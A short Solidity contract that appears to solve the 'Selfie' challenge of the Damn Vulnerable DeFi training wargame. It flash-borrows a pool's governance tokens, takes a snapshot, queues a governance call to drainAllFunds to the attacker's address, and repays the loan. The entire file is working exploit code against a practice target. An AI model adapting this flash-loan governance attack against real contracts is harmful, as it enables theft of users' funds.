// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    SelfiePool pool;
    DamnValuableTokenSnapshot public governanceToken;
    address owner;

    constructor(
        address poolAddress,
        address govnernanceTokenAddress,
        address _owner
    ) {
        pool = SelfiePool(poolAddress);
        governanceToken = DamnValuableTokenSnapshot(govnernanceTokenAddress);
        owner = _owner;
    }

    function attack() public {
        uint256 amountToBorrow = governanceToken.balanceOf(address(pool));
        pool.flashLoan(amountToBorrow);
    }

    function receiveTokens(address token, uint256 amount) public {
        governanceToken.snapshot();
        pool.governance().queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        governanceToken.transfer(address(pool), amount);
    }
}
